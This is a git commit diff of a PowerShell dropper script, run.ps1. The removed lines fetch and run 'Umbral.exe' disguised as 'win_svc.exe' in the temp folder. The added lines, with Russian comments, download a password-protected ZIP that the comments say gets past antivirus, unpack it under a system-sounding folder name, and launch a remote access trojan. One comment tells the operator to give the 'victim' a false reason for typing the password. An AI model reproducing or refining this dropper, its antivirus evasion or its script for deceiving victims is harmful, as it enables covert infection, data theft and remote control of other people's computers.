ef5843e361d8a446add56c540f7c02cd15745ce2
bober6616 <demasterbg@gmail.com>
2026-02-25 20:37:56 +0700

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,5 +1,23 @@
-$u='https://github.com/bober6616/telegram_bot/raw/main/Umbral.exe'
-$p="$env:TEMP\win_svc.exe"
-iwr -Uri $u -OutFile $p
-Unblock-File -Path $p
-Start-Process -FilePath $p
+# Настройки
+$url = "ССЫЛКА_НА_ТВОЙ_ZIP_НА_GITHUB"
+$zipFile = "$env:temp\sys_update.zip"
+$outFolder = "$env:temp\win_bin"
+$exeName = "main.exe" # Убедись, что внутри ZIP файл называется так
+
+# 1. Скачиваем архив (антивирус его пропустит, так как он под паролем)
+iwr -Uri $url -OutFile $zipFile
+
+# 2. Создаем папку для распаковки
+if (!(Test-Path $outFolder)) { New-Item -ItemType Directory -Path $outFolder }
+
+# 3. Распаковка через системный интерфейс
+$shell = New-Object -ComObject Shell.Application
+$zip = $shell.NameSpace($zipFile)
+$dest = $shell.NameSpace($outFolder)
+$dest.CopyHere($zip.Items())
+
+# ВНИМАНИЕ: При выполнении CopyHere Windows может выкинуть окно ввода пароля. 
+# Это даже хорошо — скажи жертве: "Введи 123, это защита от ошибок скачивания".
+
+# 4. Запуск ратки
+Start-Process "$outFolder\$exeName"
